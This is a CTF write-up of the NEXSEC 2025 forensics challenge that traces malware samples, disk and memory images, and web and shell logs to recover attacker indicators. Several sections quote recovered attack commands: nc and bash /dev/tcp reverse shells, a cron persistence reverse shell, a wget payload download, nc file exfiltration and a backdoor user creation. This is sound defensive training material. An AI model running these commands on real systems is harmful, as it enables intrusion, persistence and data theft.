# NEXSEC 2025 Intervarsity Cyber Forensics Challenge Writeup

> This writeup was completed as part of a team effort during NEXSEC 2025.
> My contributions focused on solving, documenting, and explaining selected challenges.

**Team:** BATERIAAA  
**Event:** NEXSEC 2025 Intervarsity Cyber Forensics Challenge  
**Categories:** Reverse Engineering, Malware Analysis, Incident Response, Digital Forensics, Memory Forensics

> This writeup is based on the team's original PDF notes and has been converted into a GitHub-friendly Markdown format.  
> All activities were performed in a CTF/lab environment for educational purposes.

---

## Table of Contents

- [Reverse Engineering](#reverse-engineering)
  - [Residual Implant](#residual-implant)
  - [Advisory Deception #1](#advisory-deception-1)
  - [Advisory Deception #2](#advisory-deception-2)
  - [Advisory Deception #3](#advisory-deception-3)
  - [Advisory Deception #4](#advisory-deception-4)
  - [QuackBot](#quackbot)
  - [Stolen Credentials / SOSO](#stolen-credentials--soso)
- [Malware Analysis](#malware-analysis)
  - [Speed Test Anomaly #1](#speed-test-anomaly-1)
  - [Speed Test Anomaly #2](#speed-test-anomaly-2)
  - [Speed Test Anomaly #3](#speed-test-anomaly-3)
  - [Speed Test Anomaly #4](#speed-test-anomaly-4)
  - [Photo Viewer Gone Rogue](#photo-viewer-gone-rogue)
  - [Birthday Trap](#birthday-trap)
- [Incident Response](#incident-response)
  - [Here's the Dump #1](#heres-the-dump-1)
  - [Here's the Dump #2](#heres-the-dump-2)
  - [Breadcrumbs Series](#breadcrumbs-series)
  - [Classic Series](#classic-series)
  - [Security Incident](#security-incident)
- [Digital Forensics](#digital-forensics)
  - [OhMyFiles Series](#ohmyfiles-series)
  - [MEMOIR Series](#memoir-series)
- [Lessons Learned](#lessons-learned)

---

# Reverse Engineering

## Residual Implant

### Objective

Identify the C2 domain hidden inside the implant binary.

### Tools Used

- NinjaBinary
- Static analysis
- Manual byte/hex inspection
- Python decoding script

### Analysis

The first step was to inspect the `main` function of the implant file using NinjaBinary. The interesting part of the binary was the command construction stored around `var_2298` / `__big`, because C2 domains are often found inside command strings such as `curl`, `wget`, `nc`, or `bash` one-liners.

A decryption loop was identified:

```text
Seed value: rdx_5 = 0x905a4d
Loop range: i = 5 .. 0x265, step 2
```

The loop decrypted two outputs:

```text
*(&__symbol + i) = *(0x100001bff + i) ^ r10_7.b
*(&var_2298 + i) = *(data_100001c00 + i) ^ rdx_5.b
```

Meaning:

- `__symbol` became a decrypted function name used by `dlsym()`.
- `var_2298` became a decrypted command string later passed to a function call.

The binary performed:

```c
handle = dlopen(NULL, 1);
fn = dlsym(handle, __symbol);
fn(__big);
```

This means the malware dynamically resolved a function and executed the decrypted command.

By dumping and decoding the bytes from `data_100001c00`, the command looked similar to:

```bash
bash -c "nc Pvt3QG28pg.capturextheflag.io 4444 -e /bin/sh"
```

### Flag

```text
Pvt3QG28pg.capturextheflag.io
```

---

## Advisory Deception #1

### Objective

Identify the DLL loaded by the suspicious executable.

### Analysis

Static analysis showed that the executable dynamically loaded a DLL using `LoadLibraryA`. The DLL name was designed to look like a legitimate Microsoft Visual C++ runtime file.

Command used:

```bash
strings "Internet Protocol Governance & Standards Advisory - March 2025.docx.exe" | grep -i dll
```

Output showed:

```text
LoadLibraryA("vcruntime140.dll")
```

### Flag

```text
vcruntime140.dll
```

---

## Advisory Deception #2

### Objective

Find the persistence or staging directory used by the malware.

### Analysis

Strings were extracted from the DLL and filtered for `ProgramData`.

Command used:

```bash
strings vcruntime140.dll | grep -i ProgramData
```

The suspicious directory found was:

```text
C:\ProgramData\MicrosoftSyncService\
```

### Flag

```text
C:\ProgramData\MicrosoftSyncService\
```

---

## Advisory Deception #3

### Objective

Identify the exported function used by the DLL.

### Analysis

The export table of `vcruntime140.dll` was inspected.

Command used:

```bash
objdump -p vcruntime140.dll | grep -i export -A20
```

One exported function stood out:

```text
__vcrt_InitializeCriticalSectionEx
```

### Flag

```text
__vcrt_InitializeCriticalSectionEx
```

---

## Advisory Deception #4

### Objective

Extract the C2 domain from the DLL beacon stage.

### Analysis

The executable loaded `vcruntime140.dll`, and the function `_CreateFrameInfo()` looked like the beacon stage. Inside the DLL, the data at `data_25d7f020` was inspected.

A related function, `sub_25d7f22d1`, appeared to process the encrypted blob. A Python script was created to reverse the logic and clean the decrypted payload.

The cleaned payload contained a PowerShell execution chain with `powercat`, where the C2 domain appeared fragmented:

```text
fjH3m58a9.cH$H$HapturextHheflag.iH$H$Ho
```

After cleaning the junk characters, the C2 domain became:

```text
fj3m58a9.capturextheflag.io
```

### Flag

```text
nexsec25{fj3m58a9.capturextheflag.io}
```

---

## QuackBot

Status:

```text
Not solved
```

---

## Stolen Credentials / SOSO

### Objective

Analyze `soso.exe` and recover the correct credential/password.

### Tools Used

- Static analysis
- Salsa20 logic review
- Python script

### Analysis

The binary accepted arguments such as:

```text
-e <text>
```

Inside the encryption routine, the program used Salsa20:

```c
salsa20_block(&_KEY, &_NONCE, 0, &var_258)
```

This generated a 64-byte Salsa20 keystream into `var_258` using the global `_KEY` and `_NONCE`.

The `_KEY` and `_NONCE` values were extracted from the binary and used in a Python script to test entries from `password.txt`.

The correct password was found by running:

```bash
python3 soso.py QWERTYasdfg12345!@#$%
```

### Flag

```text
QWERTYasdfg12345!@#$%
```

---

# Malware Analysis

## Rembayung #1

Status:

```text
Not documented in original notes
```

## Rembayung #2

Status:

```text
Not documented in original notes
```

---

## Speed Test Anomaly #1

### Objective

Identify the sandbox-related DLL or indicator.

### Analysis

The challenge was analyzed using static review of the malware sample. The discovered indicator was:

```text
SbieDll.dll
```

This is commonly associated with Sandboxie environments.

### Flag

```text
SbieDll.dll
```

---

## Speed Test Anomaly #2

### Objective

Find the minimum system drive size required for the malware to execute.

### Tools Used

- dnSpy
- Static .NET decompilation

### Analysis

The `NetworkSpeed.exe` file was decompiled using dnSpy. After extracting and reviewing `stage2.dll`, the `NetworkValidator` function revealed a disk size check.

The minimum required system drive size was:

```text
61 GB
```

### Flag

```text
nexsec25{61}
```

---

## Speed Test Anomaly #3

### Objective

Identify the filename used by the malware to save screenshots.

### Analysis

Functions in the malware were inspected until suspicious screenshot behavior was found inside `LatencyChecker`.

The malware wrote screenshots using the filename:

```text
ZxCvBnMl.jpg
```

### Flag

```text
nexsec25{ZxCvBnMl.jpg}
```

---

## Speed Test Anomaly #4

### Objective

Extract the attacker-controlled domain.

### Analysis

The `NetworkConfig` and `.cctor()` functions were reviewed to find encrypted or obfuscated configuration values. A Python script was used to decode the domain.

### Flag

```text
nexsec25{1k92jsas.capturextheflag.io}
```

---

## Photo Viewer Gone Rogue

### Objective

Analyze an APK that pretended to be a photo gallery application and recover the hidden flag.

### Tools Used

- JADX-GUI
- APK static analysis
- AES decryption script
- DEX header repair script

### Analysis

The APK was decompiled using JADX-GUI. The entry point was identified as:

```text
com.dot.gallery.GalleryApp
```

The app looked like a normal gallery viewer, but inside `GalleryApp.onCreate()`, it started a background coroutine:

```text
GalleryApp$onCreate$1
```

This called:

```text
SplashScreen.renderSplashScreen()
```

The method contained a check to detect whether the app was running on a researcher's emulator or a real victim device.

If the check passed, the app decrypted a hidden string from:

```text
R.string.splashscreen
```

The AES key was stored in:

```text
R.string.media_unlock
```

The malware downloaded a Base64-encoded and AES-encrypted payload from GitHub. After decryption, the payload appeared to be a DEX file, but JADX refused to open it due to a bad checksum.

A script was written to repair the DEX Adler-32 checksum. After fixing the DEX header, the file was decompiled successfully.

The fixed DEX revealed a keylogger-like class:

```text
DownloadSplashScreen.java
```

Inside it, a `printFlag()` function contained a final encrypted string.

Final decryption used the same key:

```text
sup453cu24k3yYo_ju57f021h4ck2024
```

### Flag

```text
nexsec25{dyn4m1c_d3x_kn0w13dg3_94in3d}
```

---

## Birthday Trap

### Objective

Statically analyze a suspicious `happy_birthday.png` file and recover the hidden flag.

### Tools Used

- `file`
- `exiftool`
- `curl`
- CyberChef

### Analysis

The file looked like an image, but `file` revealed it was actually a Windows shortcut:

```bash
file Happy_Birthday.png.lnk
```

This showed that the attacker used extension spoofing. The real extension was `.lnk`, but it used an icon to appear like an image.

Next, `exiftool` was used to inspect the shortcut properties:

```bash
exiftool Happy_Birthday.png.lnk
```

The command line arguments showed that the shortcut launched `mshta.exe` with a remote HTA URL:

```text
https://wonderpetak.github.io/W0nderpet4k/M.hta
```

Attack chain:

1. User clicks fake image shortcut.
2. Shortcut launches legitimate `mshta.exe`.
3. `mshta.exe` downloads and executes `M.hta`.
4. HTA file downloads another encoded payload.

The HTA was retrieved using:

```bash
curl https://wonderpetak.github.io/W0nderpet4k/M.hta
```

The HTA downloaded another file:

```text
wct9D39.jpg
```

The payload was decoded in CyberChef using:

1. From Base64
2. XOR

XOR settings:

```text
Key: 42
Type: Hex
```

### Flag

```text
nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}
```

---

# Incident Response

## Here's the Dump #1

### Objective

Find the SHA1 hash of a deleted suspicious file from an encrypted disk dump.

### Tools Used

- Eric Zimmerman's AmcacheParser
- Windows artifact analysis

### Analysis

The description mentioned:

- Unauthorized processes appeared.
- A suspicious file was downloaded and deleted.

Since the file was deleted but executed before deletion, the `Amcache.hve` registry hive became an important artifact. Amcache can store metadata of executed programs, including SHA1 hashes.

The user `Alina` was identified as the likely infection source because her user profile contained relevant activity.

The Amcache hive was located:

```text
Windows/appcompat/Programs/Amcache.hve
```

AmcacheParser was used to extract readable CSV output. The `UnassociatedFileEntries.csv` file was then filtered for `Alina`.

Suspicious path found:

```text
C:\Users\Alina\Downloads\a.exe
```

### Flag

```text
8dfbfdc81eef84d18ae7bc18d1381b60ac4
```

---

## Here's the Dump #2

### Objective

Find where the RAT file was downloaded from.

### Analysis

Browser history for multiple users was checked first, but no useful output was found. Since browser history and the Downloads folder appeared to be cleared, Prefetch and PowerShell logs were investigated.

A suspicious Prefetch file was found:

```text
A.EXE-04BF3E92.pf
```

The WebCache database was also checked, but it did not produce useful output.

PowerShell logs were then searched:

```bash
strings -el "Microsoft-Windows-PowerShell%4Operational.evtx" | grep "http"
```

This revealed the URL where the RAT was downloaded from.

> The original PDF notes show the investigation process, but the final URL/flag is not clearly visible in the extracted text.

---

## Breadcrumbs Series

### Scenario

TechHire Solutions received a malicious job application. The attacker uploaded a webshell and left traces in the web logs and captured traffic.

---

### Breadcrumbs #1

**Question:** What is the attacker's IP address?

The suspicious IP uploaded a malicious file and executed commands.

```text
192.168.21.102
```

---

### Breadcrumbs #2

**Question:** What malicious filename was uploaded?

```text
resume_aima.pdf.php
```

---

### Breadcrumbs #3

**Question:** What timestamp did the attacker upload the malicious file?

The upload was a POST request to `/submit.php`.

```text
13/DEC/2025:02:13:37 +0800
```

---

### Breadcrumbs #4

**Question:** What was the first webshell command?

```text
whoami
```

---

### Breadcrumbs #5

**Question:** What IP and port was the attacker planning to connect back to?

The webshell command contained a bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'
```

Answer:

```text
172.16.23.13:4444
```

---

### Breadcrumbs #6

**Question:** What was the first full command executed after reverse shell access?

The reverse shell was established over TCP port `4444`. The first command executed was:

```bash
cat /etc/os-release
```

Flag:

```text
nexsec25{cat /etc/os-release}
```

---

### Breadcrumbs #7

**Question:** What user context did the attacker operate under?

The shell prompt showed:

```text
www-data@server:/var/www/html/uploads$
```

Flag:

```text
nexsec25{www-data}
```

---

### Breadcrumbs #8

**Question:** What directory was the attacker initially located in?

The prompt showed the current directory:

```text
/var/www/html/uploads
```

Flag:

```text
nexsec25{/var/www/html/uploads}
```

---

### Breadcrumbs #9

**Question:** What password hash file did the attacker attempt to read?

The attacker tried:

```bash
cat /etc/shadow
```

The system returned permission denied.

Answer:

```text
/etc/shadow
```

---

### Breadcrumbs #10

**Question:** What command was used to search for SUID binaries?

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

### Breadcrumbs #11

**Question:** What full command was used for persistence?

The attacker added a cron-based reverse shell:

```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'") | crontab -
```

---

### Breadcrumbs #12

**Question:** What command listed active network connections and listening ports in the second reverse shell session?

```bash
ss -tulpn
```

---

### Breadcrumbs #13

**Question:** Which user's home directory did the attacker try to access?

The attacker listed `/home/`, saw `sysadmin`, and attempted to access:

```text
/home/sysadmin
```

Answer:

```text
sysadmin
```

---

## Classic Series

### Classic #1

**Question:** Which service was used to gain initial access?

Listening services and processes were inspected. SSH was exposed externally and there was evidence of an active `centos` SSH session.

Flag:

```text
nexsec25{ssh}
```

---

### Classic #2

**Question:** What IP address was used by the attacker for initial access?

The `last-wtmp` output showed successful logins by `centos` from:

```text
100.96.0.2
```

Flag:

```text
nexsec25{100.96.0.2}
```

---

### Classic #3

**Question:** What exact command downloaded the malicious binary?

The user's `.bash_history` revealed:

```bash
wget --limit-rate=1k http://192.168.8.11:8080/init.sh
```

Flag:

```text
nexsec25{wget --limit-rate=1k http://192.168.8.11:8080/init.sh}
```

---

### Classic #4

**Question:** Which directory was initially affected by ransomware?

The attacker's command history showed:

```bash
./init.sh --folder /home/centos/data_production/
```

Flag:

```text
nexsec25{/home/centos/data_production/}
```

---

### Classic #5

**Question:** Which tool was used to transfer files to the attacker's server?

The attacker's history showed file exfiltration using `nc`:

```bash
nc 192.168.8.11 8888 < Nexsec2025_Operational_Maintenance_Notes.txt
nc 192.168.8.11 8888 < Nexsec2025_System_Service_Config.conf
```

Flag:

```text
nexsec25{nc}
```

---

### Classic #6

**Question:** What was the initial file transferred out?

```text
Nexsec2025_Operational_Maintenance_Notes.txt
```

Flag:

```text
nexsec25{Nexsec2025_Operational_Maintenance_Notes.txt}
```

---

### Classic #7

**Question:** What PID was associated with the file transfer activity?

Searching for port `8888` in the process/network artifacts showed:

```text
users:(("nc",pid=9169,fd=3))
```

Flag:

```text
nexsec25{9169}
```

---

## Security Incident

The Windows Security log was exported as a text file and analyzed.

### Flag

```text
12/13/2025_12:35:23PM_webadmin
```

---

# Digital Forensics

## OhMyFiles Series

### OhMyFiles #1

**Objective:** Calculate the SHA256 hash of the `.E01` forensic disk image.

Command:

```bash
sha256sum FAKHRIWORKSTATION_20251211.E01
```

Flag:

```text
nexsec25{c8f31718462337b4cc8218c2ca301ca9ca6122cca71c708757f38788533ca076}
```

---

### OhMyFiles #2

**Objective:** Identify the extension added to encrypted files.

Using FTK Imager, encrypted files were found with the `.lock` extension.

Flag:

```text
nexsec25{.lock}
```

---

### OhMyFiles #3

**Objective:** Find the SHA256 hash of the deleted archive.

A deleted archive was found in the recycle bin:

```text
$R96XXEX.rar
```

The MD5 was checked on VirusTotal to retrieve the SHA256.

Flag:

```text
nexsec25{cfaa2ce425e2f472618323dcbceb2e3fc013100919a8dbf545bf15b4c45dae8f}
```

---

### OhMyFiles #4

**Objective:** Identify the CVE.

VirusTotal labels identified the CVE associated with the malicious archive.

Flag:

```text
nexsec25{CVE-2025-8088}
```

---

### OhMyFiles #5

**Objective:** Identify the MITRE ATT&CK technique ID.

The malicious archive used path traversal to drop a payload into the Windows Startup folder. This matched:

```text
T1547.001 - Registry Run Keys / Startup Folder
```

Flag:

```text
nexsec25{T1547.001}
```

---

### OhMyFiles #6

**Objective:** Find the full path of the ransomware.

The `.lnk` metadata showed the target path:

```text
AppData\Local\svchost.exe
```

Since the affected user was Fakhri, the full path was:

```text
C:\Users\Fakhri\AppData\Local\svchost.exe
```

Flag:

```text
nexsec25{C:\Users\Fakhri\AppData\Local\svchost.exe}
```

---

### OhMyFiles #7

**Objective:** Identify the cipher algorithm.

`NTUSER.DAT` from user Fakhri was opened using Registry Explorer. A suspicious registry key named `ShadowCrypt` was found.

The `Info` key revealed the encryption method:

```text
XOR
```

Flag:

```text
nexsec25{XOR}
```

---

### OhMyFiles #8

**Objective:** Find where the encryption keys were stored.

The keys were stored under:

```text
HKCU\SOFTWARE\ShadowCrypt\Keys
```

Flag:

```text
nexsec25{HKCU\SOFTWARE\ShadowCrypt\Keys}
```

---

### OhMyFiles #9

**Objective:** Recover the encrypted document and obtain the flag.

Encrypted files were exported from:

```text
Users\Fakhri\Documents
```

Keys from `SOFTWARE\ShadowCrypt\Keys` were tested in CyberChef using UTF-8 and XOR.

Flag:

```text
nexsec25{sh4d0w_crypt_m4st3r_2025}
```

---

### OhMyFiles #10

**Objective:** Reverse engineer the Python-based ransomware executable.

The suspicious file was:

```text
svchost.exe
```

Strings suggested that it was a Python-packed executable. `pyinstractor.py` was used to extract `.pyc` files, then PyLingual was used to decompile the `.pyc` into readable Python code.

Two constants were found:

```text
DECRYPT
RANSOM
```

Flag:

```text
nexsec25{DECRYPT_RANSOM}
```

---

# MEMOIR Series

## MEMOIR #1

### Objective

Identify the malicious document opened by the user.

### Tools Used

- Volatility3

Command used:

```bash
python3 vol.py -f memdump.mem windows.cmdline | grep -iE "Downloads|Desktop|Users"
```

`WINWORD.EXE` opened a suspicious document from the Downloads folder. Immediately after that, `cmd.exe` and `powershell.exe` activity appeared.

Flag:

```text
nexsec25{Jemputan_bengkel_Strategik.docx}
```

---

## MEMOIR #2

### Objective

Identify the C2 server IP address.

Command used:

```bash
python3 vol.py -f memdump.mem windows.netscan | grep -iE "powershell|team.exe"
```

The dropped malware `team.exe` maintained connections to:

```text
188.166.181.254
```

Flag:

```text
nexsec25{188.166.181.254}
```

---

## MEMOIR #3

### Objective

Find the GitHub repository owner used in the attack chain.

Command-line artifacts revealed the GitHub username:

```text
kimmisuuki
```

Flag:

```text
nexsec25{kimmisuuki}
```

---

## MEMOIR #4

### Objective

Find the SHA1 hash of the credential dumping tool.

Command used:

```bash
python3 vol.py -f memdump.mem windows.amcache | grep -iE "mk.exe|team.exe"
```

The `mk.exe` file was identified as Mimikatz.

Flag:

```text
nexsec25{d1f7832035c3e8a73cc78afd28cfd7f4cece6d20}
```

---

## MEMOIR #5

### Objective

Identify the PowerShell script used for UAC bypass.

A Base64-encoded PowerShell command was found in command-line artifacts. After decoding, the script name was:

```text
EventViewerRCE.ps1
```

Flag:

```text
nexsec25{EventViewerRCE.ps1}
```

---

## MEMOIR #6

### Objective

Identify the SHA1 hash of the backdoor.

Command used:

```bash
python3 vol.py -f memdump.mem windows.amcache.Amcache | grep "team.exe"
```

Flag:

```text
nexsec25{255d932fa4418ac11b384b125a7d7d91f8eb28f4}
```

---

## MEMOIR #7

### Objective

Find the persistence registry value name.

Registry hives were listed using:

```bash
python3 vol.py -f memdump.mem windows.registry.hivelist
```

The suspicious persistence value name was:

```text
selamat
```

Flag:

```text
nexsec25{selamat}
```

---

## MEMOIR #8

### Objective

Find the username and password of a newly created user.

Command used:

```bash
strings -e l memdump.mem | grep -i "net user" | grep "/add"
```

The recovered command showed a newly created user:

```text
fakhri:admin123
```

Flag:

```text
nexsec25{fakhri:admin123}
```

---

## MEMOIR #9

### Objective

Identify the file uploaded to the C2 server.

Command used:

```bash
strings -e l memdump.mem | grep -i "curl" | grep -i ".zip"
```

The recovered upload command showed the file:

```text
Documents.zip
```

Flag:

```text
nexsec25{Documents.zip}
```

---

# Lessons Learned

This CTF covered several practical DFIR and malware analysis skills:

- Static malware analysis without executing suspicious files.
- Identifying DLL side-loading and suspicious exports.
- Extracting C2 indicators from obfuscated payloads.
- Using Windows artifacts such as Amcache, Prefetch, PowerShell logs, and `.bash_history`.
- Investigating Linux reverse shell activity from PCAP and logs.
- Recovering ransomware indicators from disk images and registry hives.
- Using Volatility3 for memory forensics.
- Understanding persistence through Startup folders, cron jobs, and registry keys.

---

# Notes for Portfolio Use

Recommended GitHub structure:

```text
CTF-Writeups/
└── NEXSEC-2025/
    └── NEXSEC2025_BATERIAAA_Writeup.md
```

Recommended portfolio project card:

```text
NEXSEC 2025 Cyber Forensics Challenge Writeup
A full DFIR and malware analysis writeup covering reverse engineering, ransomware investigation, incident response, and memory forensics.
```
